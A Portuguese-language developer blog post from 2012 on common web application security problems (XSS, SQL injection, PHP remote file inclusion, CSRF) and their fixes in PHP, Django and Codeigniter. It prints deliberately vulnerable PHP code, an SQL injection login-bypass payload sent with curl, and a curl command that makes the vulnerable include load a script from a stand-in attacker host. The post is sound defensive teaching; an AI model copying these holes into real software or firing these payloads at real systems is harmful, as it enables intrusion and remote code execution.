Title: Problemas comuns de segurança em aplicações Web
Date: 2012-04-15 18:03:48
Category: desenvolvimento
Tags: desenvolvimento, web, segurança, xss, csrf, sql-injection, php-injection, django, php, codeigniter
Slug: problemas-de-seguranca-em-aplicacoes-web
meta_description: Quando estamos desenvolvendo nossas aplicações Web, temos que “pensar” como um usuário mal-intencionado. Não somente para garantir o bom funcionamento da mesma, mas também para garantir a segurança e bem-estar dos “usuários civis” que consomem os nossos serviços.


{% img representative-image /images/blog/security.jpg 180 180 Segurança %}
Seria perfeito se o mundo fosse feito apenas de pessoas
bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem
a raça humana, do que o homem deixar de tirar proveito de alguma
situação.

Quando estamos desenvolvendo nossas aplicações [*Web*][], temos que
“pensar” como um usuário mal-intencionado. Não somente para garantir o
bom funcionamento da mesma, mas também para garantir a segurança e
bem-estar dos “usuários civis” que consomem os nossos serviços.

<!-- PELICAN_END_SUMMARY -->

Vamos explorar alguns problemas relacionados a segurança, e mostrar como
solucioná-los de forma simples e prática.


Use frameworks!
---------------

E esta é a minha primeira dica para você: use *frameworks* sempre que
possível!

Eles já possuem um conjunto de ferramentas que contornam problemas como
*SQL Injection*, *XSS* e *CSRF*. Pessoas muito inteligentes já pensaram no
problema e já solucionaram para você. Na maioria dos casos, mais de uma vez!

Em alguns *frameworks*, como o [*Django*][] e [*Codeigniter*][], essas
ferramentas são quase “transparentes”, ou seja, você tem pouco (ou
nenhum) trabalho para utilizá-las no cotidiano.

Já trabalhei por muito tempo com “desenvolvimento from scratch”, e hoje
posso apontar vários pontos de falhas em aplicações que produzi no
passado. Os *frameworks* diminuem muito estes pontos, por isso vale a
pena o seu uso.


Validações (nunca confie no usuário)
------------------------------------

Como eu comecei com o [*PHP*][], sei muito bem que este é um problema
comum em aplicações desenvolvidas por iniciantes.

**Nunca confie no usuário**, e principalmente **nunca confie em
validações realizadas pelo [*Javascript*][]**. Todo ponto de entrada de
informação deve possuir uma validação no *server-side*, mesmo que exista
uma validação no *client-side*. **Lembre-se:** Existem navegadores que
não utilizam *Javascript*, e mesmo os que utilizam, permitem que o
usuário desabilite esta função.

No *Django*, podemos fazer validações de formulários através de
[*Forms*][]. No *Codeigniter* fazemos através da [*Form Validation
Class*][]. Em *PHP* “puro”, podemos fazer validações através da
[biblioteca *Validate*][].

As ferramentas citadas acima são extremamente eficientes para ações
realizadas via *POST*. Mas e quando temos parâmetros vindos da *URL*,
através do método *GET*, qual é a melhor maneira de agirmos?


### URLs seguras e amigáveis


Há um bom tempo que as “URLs amigáveis” deixaram de ser um diferencial
nas aplicações *Web* e tornaram-se item obrigatório. Além de trazer o
benefício do [*SEO*][], elas podem ser uma grande aliada quando o
assunto é segurança.

*URLs* que antes eram feitas dessa maneira:

    ::bash
    /blog.php?year=2012&month=12&day=21

Podem ser reproduzidas desta forma:

    ::bash
    /blog/2012/12/21/

O mecanismo de rotas de alguns *frameworks* permite a utilização de
expressões regulares na construção do caminho. Por exemplo, em *Django*
temos o seguinte cenário:

    ::python
    # urls.py

    urlpatterns = patterns('',
        ...
        (r'^blog/(?P<year>\d{4})/(?P<month>[0-9]{2})/(?P<day>\d{2})/$', 'blog.views.index'),
        ...
    )

Determinamos que a rota inicia-se por **blog**, sendo composta por um
valor numérico de 4 dígitos que atende pelo identificador **year**,
outro valor de dois dígitos, indo de 0 a 9, chamado **month**, e o
último um valor numérico de 2 dígitos chamado **day**.

A verificação é feita no momento da requisição. Se a rota informada
bater com o padrão criado, ele executa a *view* **blog.views**. Caso
contrário, se a rota não bater com nenhum padrão informado (por exemplo,
**/blog/2012/aa/21/**), o usuário tomará um erro 404.

Em nossa *view*, resgataríamos esses valores da seguinte forma:

    ::python
    # blog/views.py
    
    def index(request, year, month, day):
        # Lógica de renderização...

Simples assim! Temos um “input” de informação através de *GET*, onde
temos certeza do seu tipo e tamanho.

O mesmo resultado pode ser obtido com o *Codeigniter*, basta adicionar a
expressão desejada em seu **application/config/routes.php**:

    ::php
    # application/config/routes.php
    
    $route['blog/(\d{4})/([0-9]{2})/(\d{2})'] = "blog/index/$1/$2/$3";

Aos invés de utilizarmos identificadores, utilizamos a ordem dos grupos
criados na expressão regular.

Você não precisa utilizar um *framework* para ter um esquema de rotas
como ilustrado acima. Um resultado parecido pode ser atingido através do
[*Nginx*][] e do *Apache* com *mod-rewrite*. [Veja um exemplo de uso][]
apresentado numa *thread* do *Stack Overflow*.

É claro que verificações mais complexas, como por exemplo, se o nome do
usuário informado na *URL* é válido, necessitam de regras específicas,
muito provavelmente escritas dentro da *view*. Um ponto de falha que
vale ressaltar é a criação de expressões regulares “genéricas”, que não
discriminam o tipo e tamanho dos valores informados.


### Verificação de tipos de dados


Mas e quando não temos como fugir de um valor passado via *GET*? Pode
acontecer! Por exemplo, em paginações (onde normalmente passamos um
valor **page** como parâmetro), ou em uma busca (onde passamos o valor
pesquisado via *GET*).

Nesse caso, “forçamos” o tipo do dado informado, e diminuímos problemas
de interpretação do nosso código:

    ::php
    <?php

    $page = isset($_GET['page']) && preg_match('/^\d+$/', $_GET['page']) ? $_GET['page'] : 1;

    ?>

A solução acima não é infalível, mas é uma maneira de diminuirmos a
incidência de erros. Se um valor diferente de inteiro positivo for
passado, a página a ser exibida será a primeira.


XSS – Cross-Site Scripting (não confie na informação)
-------------------------------------------------------------------------------


É certo que, validando toda e qualquer
informação que a sua aplicação receber, você diminuirá muito a
ocorrência de problemas. Mas, mesmo confiando no tipo e nas dimensões da
informação, não podemos confiar no seu conteúdo.

Imagine que você possua um *blog*. Só você pode escrever artigos nele,
então você conhece o conteúdo da informação sendo produzida. Certo dia
você resolve que os usuários poderão comentar no seu *blog*, e
desenvolve uma ferramenta de comentários com todas as validações citadas
anteriormente.

Até que em certo momento, um usuário mal-intencionado **escreve um
comentário** no seu *post*, e neste comentário existe um ***script***
*Javascript* que explora uma **falha de segurança** do *ActiveX* (por
exemplo). Logo, todos os leitores que utilizam *Internet Explorer* e
leram o seu *post* são infectados por um *malware* que o seu *blog*
ajudou a proliferar.

A injeção de um *script* em um *website*, através de campos de textos ou
passagem de parâmetros, é caracterizado como um ataque de ***Cross-Site
Scripting*** (ou *XSS*).

Uma maneira muito comum de evitar esse tipo de problema é simplesmente
“escapando” ou removendo elementos *HTML* do conteúdo:

    ::php
    <?php
    # xss.php
    
    $var = $_GET['var'];

    echo htmlspecialchars($var);

    ?>

Acessar **xss.php** com um **alert** *Javascript* como parâmetro, não
executará o comando, e sim apenas exibirá o conteúdo na tela, com os
caracteres que delimitam o elemento **script** devidamente formatados:

    ::bash
    http://localhost/xss.php?var=&lt;script&gt;alert("XSS!");&lt;/script&gt;

Existem alguns [*Rich Text Editors*][] que verificam e formatam o
conteúdo do campo antes de uma submissão. Mas **lembre-se**! Editores
*WYSIWYG* são basicamente *Javascript*, logo, se eu desabilitar o
*Javascript* do meu navegador, posso enviar *scripts* maliciosos sem
impeditivo nenhum, por isso, é sempre necessário fazermos esse tipo de
validação no *server-side*.

O *Codeigniter*, com a opção **$config['global\_xss\_filtering’]** como
**TRUE**, filtra automaticamente os dados resgatados de *GET* ou *POST*.
O que acho bacana desse filtro, é que ele previne apenas a injeção de
*scripts* e atributos que podem de alguma forma prejudicar na segurança
da sua aplicação, não necessariamente formatando o conteúdo todo.

Este tratamento está ativo por padrão no *engine* de *templates* do
*Django*. Embora isso não impeça o armazenamento do *script* no banco de
dados, impede que a sua renderização afete os usuários da sua aplicação.

Uma outra forma muito bacana de prevenir este tipo de inconveniente é
utilizando uma linguagem de marcação alternativa, como *Textile* e
*Markdown*, em campos de textos abertos.


SQL Injection (não confie em sua aplicação)
---------------------------------------------------------------------


Entre as vulnerabilidades citadas, acredito que o
***SQL Injection*** é uma das mais
destrutivas, tanto para a sua aplicação, quanto para os seus usuários.

Segundo o *Wikipedia*:

> É um tipo de ameaça de segurança que se aproveita de falhas em
> sistemas que interagem com bases de dados via SQL. A injeção de
> SQL ocorre quando o atacante consegue inserir
> uma série de instruções SQL dentro de uma
> consulta (query) através da manipulação das entrada de dados de uma
> aplicação.

Os resultados podem ser os mais desastrosos, como por exemplo, o acesso
de usuários não autorizados a áreas restritas, e o roubo de informações
da sua base de dados. Abaixo, uma autenticação simples, utilizando nome
de usuário e senha:

    ::php
    <?php
    # sql-injection.php
    
    if (isset($_POST['usuario']) && isset($_POST['senha'])) {
        $usuario    = $_POST['usuario'];
        $senha      = $_POST['senha'];
        
        // Abre conexão com o banco de dados
        $link = mysql_connect('localhost', 'root', '');
        // Seleciona a base de dados
        mysql_select_db('exemplos_blog');

        // Faz a consulta ao banco, comparando usuário e senha
        $query = "SELECT 1 FROM usuario WHERE usuario = '{$usuario}' "
            . "AND senha = '{$senha}'";
        $result = mysql_query($query) or die("Query inválida: "
            . mysql_error() . "\n");

        mysql_close($link);
        
        if (mysql_num_rows($result)) {
            // Vai para a página logada
            echo 'Login com sucesso';
        } else {
            // Errou o usuário e senha, volta para a página de login
            echo 'Usuário e senha inválidos';
        }
    } else {
        // Vai para a página de login
    }

    ?>

Levando em consideração que temos um usuário com nome **teste** e senha
**teste**, se executarmos a instrução abaixo, será exibida uma mensagem
de *login* inválido:

    ::bash
    $ curl --data "usuario=foo&senha=bar" http://localhost/sql-injection.php

    Usuário e senha inválidos

Evidente! Este usuário não existe no banco de dados. Mas, podemos
imaginar que a aplicação não possua proteção contra injeções *SQL*,
então podemos fazer com que a consulta retorne positivo, e que nosso
acesso seja garantido mesmo não possuindo um usuário no banco de dados.

    ::bash
    $ curl --data "usuario=foo&senha=bar' OR '1' = '1" http://localhost/sql-injection.php

    Login com sucesso

A nossa *query*, por não fazermos um tratamento nos campos do
formulário, foi composta pelo valor **bar’ OR '1’ = ’1**, o que resultou
no seguinte *SQL*:

    ::sql
    SELECT 1 FROM usuario WHERE usuario = 'foo' AND senha = 'bar' OR '1' = '1'

Existem algumas soluções para este problema, como o uso de
**addslashes** no *PHP*, mas os que fazem mais sentido para mim são:

* O uso da função **mysql\_real\_escape\_string** para formatar dados
  antes de construir a *query*;
* O uso da classe **mysqli** para consultas a bancos de dados *MySQL*,
  ao invés do uso das funções **mysql**.

A primeira é a mais prática de aplicarmos. No código anterior, bastaria
formatar os valores na hora que são resgatados do *array* **$\_POST**:

    ::php
    $usuario    = mysql_real_escape_string($_POST['usuario']);
    $senha      = mysql_real_escape_string($_POST['senha']);

Com o **mysqli**, precisamos fazer algumas alterações no código, como
demonstrado abaixo:

    ::php
    <?php
    # sql-injection.php (com mysqli)
    
    if (isset($_POST['usuario']) && isset($_POST['senha'])) {
        $usuario    = $_POST['usuario'];
        $senha      = $_POST['senha'];

        // Abre conexão com o banco de dados
        $mysqli = new mysqli('localhost', 'root', '', 'exemplos_blog');
        // Faz a consulta ao banco, comparando usuário e senha
        $query = $mysqli->prepare("SELECT 1 FROM usuario WHERE usuario = ? "
            . "AND senha = ?");
        $query->bind_param('ss', $usuario, $senha);
        $query->execute();
        $query->store_result();
        
        $num_rows = $query->num_rows;
        
        $query->close();
        
        if ($num_rows) {
            // Vai para a página logada
            echo 'Login com sucesso';
        } else {
            // Errou o usuário e senha, volta para a página de login
            echo 'Usuário e senha inválidos';
        }
    } else {
        // Vai para a página de login
    }

    ?>

Mas como o mundo não é feito só de *MySQL*, se ocorrer de você utilizar
um outro banco de dados, eu recomendo o uso da biblioteca [*PDO*][].

Como o [*Django* utiliza *ORM*][], e o [*Codeigniter* tem a *Active
Record Class*][], nesses *frameworks* essa validação é feita no momento
que interagimos com os seus *models*. Mas é sempre bom ter cuidado!
Principalmente quando o *ORM* não atende o nosso requisito, e temos que
partir para consultas *SQL* puras.


### Senhas criptografadas


Uma boa dica é, sempre que persistirmos um usuário em nossa base de
dados, armazenarmos a sua senha criptografada em um formato “sem volta”
(conhecido como *hash*). Além de ser um princípio ético, que na minha
opinião todo o desenvolver de aplicações deveria ter, garantimos que
mesmo que a nossa aplicação seja invadida, as senhas dos usuários
estarão “seguras”.

Embora o [*MD5*][] e o [*SHA1*][] sejam as escolhas mais populares, os
desenvolvedores do *Django* [recomendam o uso de algoritmos mais sofisticados][],
como o [*PBKDF2*][], por acreditarem que o poder
computacional atingiu um nível, que senhas *MD5* e *SHA1* podem com
considerável esforço ser quebradas.


PHP Injection (não confie no PHP)
-------------------------------------------------------------------------------------


Embora esta técnica possa acontecer em outras linguagens, o *PHP* dá
muita margem para desenvolvedores menos experientes deixarem brechas
para uma vulnerabilidade conhecida como ***PHP
Injection***.

Com o site dividido em seções, é comum termos inclusões de arquivos
*PHP* para compor uma página. Para economizar esforço e linhas de
código, deixamos as partes como menu e topo “estáticas”, e só alteramos
o conteúdo do bloco principal da página. Acontece que em alguns casos, o
desenvolvedor espera que um determinado arquivo seja importado de acordo
com a *URL* que o internauta está visitando. Por exemplo:

    ::php
    <?php
    # php-injection.php
    
    $page = $_GET['page'];

    include('topo.php');
    include('menu.php');

    include($page);
    
    ?>

Logo:

    ::bash
    $ curl http://localhost/php-injection.php?page=novidades.php

No caso acima, estamos incluindo o arquivo **novidades.php** e
automaticamente exibindo o seu conteúdo. Podemos navegar por outras
áreas do *website*, por exemplo, **page=contato.php** ou
**page=institucional.php**. Mas, e se informarmos
**page=php-injection.php**?

Caímos num *looping* infinito!

E, infelizmente, esse é o menor dos nossos problemas. O *PHP*, quando
configurado com a opção **allow\_url\_include** como **TRUE**, é capaz
de importar arquivos de outros *hosts*. Logo, o atacante pode ter um
*script* malicioso hospedado em seu servidor, e passar o caminho dele
para a aplicação acima. A aplicação incluirá e interpretará o *PHP* que
estiver neste *script*:

    ::bash
    $ curl http://localhost/php-injection.php?page=http://sitedoatacante.com.br/meu-script-malicioso.php.txt

Pronto! Temos código *PHP* de outra pessoa executando em nosso servidor.

Para resolver este problema, configure a opção **allow\_url\_include**
em seu **php.ini** como **FALSE**. Outro passo importante é, sempre que
for importar algum arquivo que dependa de informações vindas do usuário,
verifique o conteúdo desta informação. Exemplo:

    ::php
    switch($page) {
        case 'novidades':
            include('novidades.php');
            break;
        case 'contato':
            include('contato.php');
            break;
        case 'institucional':
            include('institucional.php');
            break;
        default:
            include('404.php');
    }

Este ataque não é tão incomum quanto deveria. Fique atento.


CSRF – Cross-site request forgery (não confie na requisição)
--------------------------------------------------------------------------------------


O ***Cross-site request forgery*** ou **falsificação de solicitação
entre sites**, é uma forma de ataque que mescla a [Engenharia Social][]
com vulnerabilidades das aplicações *Web*.

O ataque pode ser feito da seguinte forma:

* Você recebe um *e-mail* com uma *URL* oculta (geralmente algum
  *e-mail* do tipo “Veja as minhas fotos” (: )
* Esta *URL* executa alguma ação em uma aplicação que você esteja
  autenticado no momento (por exemplo, o *Facebook*)
* Esta ação pode, tanto dar poderes de acesso ao atacante, quanto
  alterar ou remover os seus dados permanentemente

Note que o primeiro item pode ser substituído por algum **conteúdo
*link* injetado via *XSS*** em algum fórum ou área de comentários de um
*blog*.

Embora o exemplo acima não represente tanta ameaça, existem vários tipos
de aplicações que este tipo de técnica pode afetar. O exemplo do banco,
encontrado no *site* [*The Open Web Application Security Project*][], é
um excelente exempo de ataque *CSRF*.

Para prevenir este tipo de problema, podemos fazer um controle através
de [Sessões][] e transmitir um *token* que identifique que a requisição
foi de fato feita pelo usuário. *Kinn Coelho Julião* escreveu [um *post* interessante para o *PHP-SP*][],
demonstrando como prevenir ataques *CSRF* através de *token*.

De fato, tanto o *Django* quanto o *Codeigniter* utilizam essa tática
para prevenir ataques *CSRF*. No *Django*, com o *middleware*
**django.middleware.csrf.CsrfViewMiddleware**, basta adicionar a chamada
da *templatetag* ao formulário:

    ::html
    <form method="post" action=".">
        {% csrf_token %}
        ...
    </form>

A *templatetag* acima criará um campo oculto no formulário chamado
**csrfmiddlewaretoken**. Quando um *POST* for realizado para a *view* em
questão, caso o conteúdo de **csrfmiddlewaretoken** vindo do formulário
não “bata” com o conteúdo armazenado em sessão, o *Django* entende que
aquela requisição não foi feita de maneira “natural” (ou seja, acessando
o formulário e submetendo-o). Logo, fica subentendido que aquela
requisição veio de outra origem, e o *framework* não executa as
instruções da *view* (retornando um código 403).

No *Codeigniter*, com a opção **$config['csrf\_protection’]** como
**TRUE** no arquivo **application/config/config.php**, o *framework*
adicionará automaticamente o campo de proteção *CSRF* na abertura do
formulário:

    ::php
    <?php form_open(); ?>


Considerações finais
--------------------


Ficou um *post* grande, mas acredito que consegui cobrir os problemas de
segurança mais conhecidos em aplicações *Web*. Como é possível notar,
são vulnerabilidades que são facilmente contornáveis, mas que podem
trazer sérios problemas para você e seus usuários caso a sua aplicação
não esteja segura o bastante.

Reforço: Se você tiver a oportunidade de utilizar um *framework*,
utilize! Eles possuem soluções prontas e bem testadas para prevenir os
problemas citados acima, e outros tantos que surgem a cada dia na
*internet*.


Referências
-----------


* [*Caugh in a Web: Validating an integer in PHP*][]
* [*Codeigniter User Guide: Active Record Class*][]
* [*Codeigniter User Guide: Security*][]
* [*Django Documentation: Making queries*][]
* [*Django Documentation: Security in Django*][]
* [Invasão.com.br: *PHP Injection* – O fim das dúvidas][]
* [*PHP Documentation: MySQL Melhorada*][]
* [*PHP Documentation: PDO – PHP Data Objects*][]
* [*PHP SP*: Protegendo o seu sistema contra ataques *CSRF*][]
* [*Site Point: Top 7 PHP Security Blunders Article*][]
* [*Stack Overflow: Best way to stop SQL injection in PHP*][]
* [*The Open Web Application Security Project: Cross-Site Request Forgery*][]
* [*Wikipedia: Code Injection*][]
* [*Wikipedia*: Injeção de *SQL*][]


  [*Web*]: {tag}web
    "Leia mais sobre Web"
  [*Django*]: {tag}django
    "Leia mais sobre Django"
  [*Codeigniter*]: {tag}codeigniter
    "Leia mais sobre Codeigniter"
  [*PHP*]: {tag}php
    "Leia mais sobre PHP"
  [*Javascript*]: {tag}javascript
    "Leia mais sobre Javascript"
  [*Forms*]: https://docs.djangoproject.com/en/dev/topics/forms/
    "Conheça os Forms no Django"
  [*Form Validation Class*]: http://codeigniter.com/user_guide/libraries/form_validation.html
    "Veja como fazer validações de formulário no Codeigniter"
  [biblioteca *Validate*]: http://pear.php.net/manual/en/package.validate.validate.intro.php
    "Instale a Validate através da PEAR"
  [*SEO*]: http://pt.wikipedia.org/wiki/Otimiza%C3%A7%C3%A3o_para_motores_de_busca
    "Leia mais sobre SEO no Wikipedia"
  [*Nginx*]: {tag}nginx
    "Leia mais sobre Nginx"
  [Veja um exemplo de uso]: http://stackoverflow.com/questions/812571/how-to-create-friendly-url-in-php
    "Como criar rotas para arquivos PHP com o Apache"
  [*Rich Text Editors*]: http://www.webdesignerdepot.com/2008/12/20-excellent-free-rich-text-editors/
    "Conheça 20 excelentes editores WYSIWYG"
  [*PDO*]: http://php.net/pdo
    "Conheça a lib PDO do PHP"
  [*Django* utiliza *ORM*]: https://docs.djangoproject.com/en/1.4/topics/db/queries/
    "Making queries"
  [*Codeigniter* tem a *Active Record Class*]: http://codeigniter.com/user_guide/database/active_record.html
    "Active Record Class"
  [*MD5*]: http://pt.wikipedia.org/wiki/MD5
    "Conheça o algoritmo MD5"
  [*SHA1*]: http://pt.wikipedia.org/wiki/SHA1
    "Conheça o algoritmo SHA1"
  [recomendam o uso de algoritmos mais sofisticados]: https://docs.djangoproject.com/en/dev/releases/1.4/#improved-password-hashing
    "Leia a release note do Django 1.4"
  [*PBKDF2*]: http://en.wikipedia.org/wiki/PBKDF2
    "Conheça o algoritmo PBKDF2"
  [Engenharia Social]: http://pt.wikipedia.org/wiki/Engenharia_social_(seguran%C3%A7a_da_informa%C3%A7%C3%A3o)
    "Leia mais sobre Engenharia Social no Wikipedia"
  [*The Open Web Application Security Project*]: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
    "Leia mais sobre CSRF"
  [Sessões]: {filename}/entendendo-os-cookies-e-sessoes.md
    "Entendendo o Cookies e Sessões"
  [um *post* interessante para o *PHP-SP*]: http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/
    "Protegendo seus sistemas contra ataques CSRF"
  [*Caugh in a Web: Validating an integer in PHP*]: http://www.dinke.net/blog/en/2011/10/20/validating-an-integer-with-php/
    "As diferentes formas de validarmos um valor inteiro em PHP"
  [*Codeigniter User Guide: Active Record Class*]: http://codeigniter.com/user_guide/database/active_record.html
    "Saiba como fazer consultas eficientes ao banco de dados com o Codeigniter"
  [*Codeigniter User Guide: Security*]: http://codeigniter.com/user_guide/general/security.html
    "Veja as dicas de segurança dadas pelo time do Codeigniter"
  [*Django Documentation: Making queries*]: https://docs.djangoproject.com/en/1.4/topics/db/queries/
    "Saiba como construir modelos e como consultá-los através do ORM do Django"
  [*Django Documentation: Security in Django*]: https://docs.djangoproject.com/en/dev/topics/security/
    "Veja dicas preciosas de segurança utilizando o Django"
  [Invasão.com.br: *PHP Injection* – O fim das dúvidas]: http://www.invasao.com.br/2008/03/18/php-injection-o-fim-das-duvidas/
    "Entenda como funciona um ataque via PHP Injection"
  [*PHP Documentation: MySQL Melhorada*]: http://www.php.net/manual/pt_BR/book.mysqli.php
    "Conheça a mysqli direto da documentação do PHP"
  [*PHP Documentation: PDO – PHP Data Objects*]: http://php.net/pdo
    "Conheça uma das formas mais eficientes de fazer consultas a bancos de dados no PHP"
  [*PHP SP*: Protegendo o seu sistema contra ataques *CSRF*]: http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/
    "Aprenda como utilizar tolkens para prevenir ataques CSRF"
  [*Site Point: Top 7 PHP Security Blunders Article*]: http://www.sitepoint.com/php-security-blunders/
    "Excelentes dicas de segurança para quem programa em PHP"
  [*Stack Overflow: Best way to stop SQL injection in PHP*]: http://stackoverflow.com/questions/60174/best-way-to-stop-sql-injection-in-php
    "Excelente thread no Stack Overflow, sobre SQL injection"
  [*The Open Web Application Security Project: Cross-Site Request Forgery*]: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
    "Um bom artigo sobre o conceito do CSRF"
  [*Wikipedia: Code Injection*]: http://en.wikipedia.org/wiki/Code_injection
    "Leia mais sobre as formas de injeção de código no Wikipedia"
  [*Wikipedia*: Injeção de *SQL*]: http://pt.wikipedia.org/wiki/Inje%C3%A7%C3%A3o_de_SQL
    "Leia mais sobre SQL Injection no Wikipedia"
